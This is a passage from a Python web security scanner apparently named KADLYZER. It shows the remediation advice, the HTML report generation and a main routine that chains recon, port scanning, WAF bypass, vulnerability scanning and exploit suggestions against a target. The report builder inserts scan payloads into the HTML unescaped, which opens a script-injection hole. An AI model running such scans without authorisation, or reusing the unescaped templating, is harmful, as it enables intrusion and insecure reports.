    
    if critical_ports:
        recommendations.append({
            "category": "Network",
            "title": "Secure Exposed Services",
            "description": f"Critical services exposed: {', '.join([str(p) for p in critical_ports])}. Consider restricting access with firewall rules.",
            "priority": "High"
        })
    
    # Directory security
    sensitive_dirs = results.get("directories", {})
    admin_panels = [info['url'] for dir_name, info in sensitive_dirs.items() 
                   if any(sensitive in dir_name.lower() for sensitive in ["admin", "login", "dashboard"])]
    
    if admin_panels:
        recommendations.append({
            "category": "Access Control",
            "title": "Secure Administrative Interfaces",
            "description": "Administrative interfaces are publicly accessible. Consider IP restrictions, VPN access, or strong authentication.",
            "priority": "High"
        })
    
    # Vulnerability-specific recommendations
    vulnerabilities = results.get("vulnerabilities", {})
    
    if vulnerabilities.get("sql_injection", []):
        recommendations.append({
            "category": "Development",
            "title": "Fix SQL Injection Vulnerabilities",
            "description": "Implement parameterized queries and input validation for all database operations.",
            "priority": "Critical"
        })
    
    if vulnerabilities.get("xss", []):
        recommendations.append({
            "category": "Development",
            "title": "Fix Cross-Site Scripting Vulnerabilities",
            "description": "Implement output encoding and Content Security Policy (CSP) to prevent XSS attacks.",
            "priority": "High"
        })
    
    if vulnerabilities.get("path_traversal", []):
        recommendations.append({
            "category": "Development",
            "title": "Fix Path Traversal Vulnerabilities",
            "description": "Validate file paths and use safe APIs for file operations. Consider a whitelist approach for file access.",
            "priority": "Critical"
        })
    
    if vulnerabilities.get("command_injection", []):
        recommendations.append({
            "category": "Development",
            "title": "Fix Command Injection Vulnerabilities",
            "description": "Avoid using shell commands with user input. If necessary, implement strict input validation and command whitelisting.",
            "priority": "Critical"
        })
    
    # General recommendations
    recommendations.append({
        "category": "General",
        "title": "Implement Regular Security Testing",
        "description": "Schedule regular security assessments, vulnerability scanning, and penetration testing.",
        "priority": "Medium"
    })
    
    return recommendations

def generate_html_report(report_data):
    """Generate HTML report from the JSON data"""
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KADLYZER Security Report - {report_data['scan_info']['domain']}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        header {{
            background-color: #2c3e50;
            color: white;
            padding: 20px;
            text-align: center;
        }}
        h1, h2, h3 {{
            margin-top: 0;
        }}
        .summary-box {{
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            padding: 20px;
            margin-bottom: 20px;
        }}
        .risk-score {{
            text-align: center;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            color: white;
            font-weight: bold;
        }}
        .risk-low {{
            background-color: #27ae60;
        }}
        .risk-medium {{
            background-color: #f39c12;
        }}
        .risk-high {{
            background-color: #e74c3c;
        }}
        .risk-critical {{
            background-color: #c0392b;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }}
        th, td {{
            text-align: left;
            padding: 12px;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background-color: #f2f2f2;
        }}
        tr:hover {{
            background-color: #f5f5f5;
        }}
        .priority-high {{
            color: #e74c3c;
            font-weight: bold;
        }}
        .priority-medium {{
            color: #f39c12;
            font-weight: bold;
        }}
        .priority-low {{
            color: #27ae60;
            font-weight: bold;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: #7f8c8d;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <header>
        <h1>KADLYZER Security Report</h1>
        <p>Target: {report_data['scan_info']['domain']} | Date: {report_data['scan_info']['timestamp']}</p>
    </header>
    
    <div class="container">
        <div class="risk-score risk-{report_data['risk_score']['level'].lower()}">
            <h2>Overall Risk: {report_data['risk_score']['level']}</h2>
            <p>Score: {report_data['risk_score']['score']}/{report_data['risk_score']['max_score']}</p>
        </div>
        
        <div class="summary-box">
            <h2>Executive Summary</h2>
            <p>
                This report presents the findings of a security assessment performed on {report_data['scan_info']['domain']}.
                The assessment identified a risk score of {report_data['risk_score']['score']}/{report_data['risk_score']['max_score']}, 
                which is categorized as {report_data['risk_score']['level']} risk.
            </p>
            
            <h3>Key Findings:</h3>
            <ul>
                <li>Web Application Firewall (WAF): {'Detected' if report_data['summary']['waf']['detected'] else 'Not Detected'}</li>
                <li>Open Ports: {report_data['summary']['ports']['open_ports_count']} ports discovered</li>
                <li>Sensitive Directories: {report_data['summary']['directories']['sensitive_dirs_count']} found</li>
                <li>Vulnerabilities: {report_data['summary']['vulnerabilities']['total_count']} potential issues discovered</li>
            </ul>
        </div>
        
        <div class="summary-box">
            <h2>Recommendations</h2>
            <table>
                <tr>
                    <th>Category</th>
                    <th>Recommendation</th>
                    <th>Priority</th>
                </tr>
    """
    
    # Add recommendations to table
    for rec in report_data.get('recommendations', []):
        priority_class = f"priority-{rec['priority'].lower()}"
        html += f"""
                <tr>
                    <td>{rec['category']}</td>
                    <td>
                        <strong>{rec['title']}</strong><br>
                        {rec['description']}
                    </td>
                    <td class="{priority_class}">{rec['priority']}</td>
                </tr>
        """
    
    html += """
            </table>
        </div>
        
        <div class="summary-box">
            <h2>Detailed Findings</h2>
    """
    
    # Add vulnerabilities section if found
    vulnerabilities = report_data['details'].get('vulnerabilities', {})
    if any(vulnerabilities.values()):
        html += """
            <h3>Vulnerabilities</h3>
            <table>
                <tr>
                    <th>Type</th>
                    <th>Parameter</th>
                    <th>Details</th>
                </tr>
        """
        
        for vuln_type, vulns in vulnerabilities.items():
            if not vulns:
                continue
                
            for i, vuln in enumerate(vulns):
                # Only show first 5 of each type to keep report manageable
                if i >= 5:
                    break
                    
                html += f"""
                <tr>
                    <td>{vuln_type.replace('_', ' ').title()}</td>
                    <td>{vuln['parameter']}</td>
                    <td>
                        Payload: <code>{vuln['payload']}</code><br>
                        URL: {vuln.get('url', 'N/A')}
                    </td>
                </tr>
                """
        
        html += """
            </table>
        """
    
    # Add open ports section if found
    ports = report_data['details'].get('ports', {})
    if ports:
        html += """
            <h3>Open Ports</h3>
            <table>
                <tr>
                    <th>Port</th>
                    <th>Service</th>
                    <th>Banner</th>
                </tr>
        """
        
        for port, info in sorted(ports.items()):
            html += f"""
            <tr>
                <td>{port}</td>
                <td>{info['service']}</td>
                <td>{info.get('banner', 'N/A')}</td>
            </tr>
            """
        
        html += """
            </table>
        """
    
    # Add sensitive directories section if found
    directories = report_data['details'].get('directories', {})
    if directories:
        html += """
            <h3>Sensitive Directories</h3>
            <table>
                <tr>
                    <th>URL</th>
                    <th>Status</th>
                    <th>Details</th>
                </tr>
        """
        
        for dir_name, dir_info in directories.items():
            html += f"""
            <tr>
                <td>{dir_info['url']}</td>
                <td>{dir_info['status_code']} {dir_info['status']}</td>
                <td>Size: {dir_info['content_length']} bytes</td>
            </tr>
            """
        
        html += """
            </table>
        """
    
    html += """
        </div>
        
        <div class="footer">
            <p>This report was generated by KADLYZER v8.0. For authorized security testing only.</p>
            <p>The information in this report should be used responsibly and ethically.</p>
        </div>
    </div>
</body>
</html>
    """
    
    return html

def main():
    banner()
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="KADLYZER v8.0 - Enhanced Security Testing Tool")
    parser.add_argument("--target", "-t", help="Target domain or URL", type=str)
    parser.add_argument("--output", "-o", help="Output directory for reports", type=str, default="reports")
    parser.add_argument("--full", "-f", help="Perform full scan (slower but more thorough)", action="store_true")
    parser.add_argument("--threads", help="Number of threads for concurrent operations", type=int, default=20)
    parser.add_argument("--timeout", help="Connection timeout in seconds", type=float, default=5.0)
    parser.add_argument("--quiet", "-q", help="Quiet mode, only output to log file", action="store_true")
    
    args = parser.parse_args()
    
    # Get target input if not provided as argument
    target = args.target
    if not target:
        target = input("Enter target domain or URL: ").strip()
    
    if not target:
        logger.error("No target specified. Exiting.")
        return
    
    try:
        # Validate and normalize target
        target_info = validate_target(target)
        logger.info(f"Starting scan on {target_info['full_url']}...")
        
        # Display a disclaimer
        print(f"\n{Colors.WARNING}DISCLAIMER: This tool is for authorized security testing only.{Colors.ENDC}")
        print(f"{Colors.WARNING}Ensure you have permission to scan the target.{Colors.ENDC}\n")
        
        # Storage for all results
        results = {}
        
        # Reconnaissance phase
        logger.info("Phase 1: Reconnaissance")
        results["recon"] = recon(target_info)
        
        # Port scanning phase
        logger.info("Phase 2: Port Scanning")
        results["ports"] = scan_ports(target_info, max_threads=args.threads, timeout=args.timeout, scan_all=args.full)
        
        # WAF detection phase
        logger.info("Phase 3: WAF Detection")
        results["waf"] = bypass_waf(target_info)
        
        # Directory scanning phase
        logger.info("Phase 4: Directory Scanning")
        results["directories"] = directory_scan(target_info, threads=args.threads)
        
        # Vulnerability scanning phase
        logger.info("Phase 5: Vulnerability Scanning")
        waf_bypass_headers = None
        if results["waf"].get("bypass_successful", False):
            for header in BYPASS_WAF_HEADERS:
                if header.get("User-Agent") == results["waf"].get("successful_method", {}).get("User-Agent"):
                    waf_bypass_headers = header
                    break
        
        results["vulnerabilities"] = vulnerability_scan(target_info, waf_bypass_headers)
        
        # Generate exploit suggestions
        logger.info("Phase 6: Generating Exploit Suggestions")
        results["exploit_suggestions"] = exploit_suggestion(results["vulnerabilities"], target_info)
        
        # Generate final report
        logger.info("Phase 7: Generating Report")
        report_info = generate_report(target_info, results)
        
        print(f"\n{Colors.GREEN}Scan completed!{Colors.ENDC}")
        print(f"JSON Report: {report_info['json_path']}")
        print(f"HTML Report: {report_info['html_path']}")
        
        # Print risk score
        risk_level = report_info['risk_score']['level']
        risk_color = Colors.GREEN
        if risk_level == "Medium":
            risk_color = Colors.WARNING
        elif risk_level in ["High", "Critical"]:
            risk_color = Colors.FAIL
            
        print(f"\nOverall Risk Level: {risk_color}{risk_level}{Colors.ENDC}")
        print(f"Risk Score: {risk_color}{report_info['risk_score']['score']}/100{Colors.ENDC}")
        
    except KeyboardInterrupt:
        logger.warning("Scan interrupted by user")
        print(f"\n{Colors.WARNING}Scan interrupted. Exiting...{Colors.ENDC}")
    except Exception as e:
        logger.error(f"An error occurred: {str(e)}")
        print(f"\n{Colors.FAIL}Error: {str(e)}{Colors.ENDC}")

if __name__ == "__main__":
    main()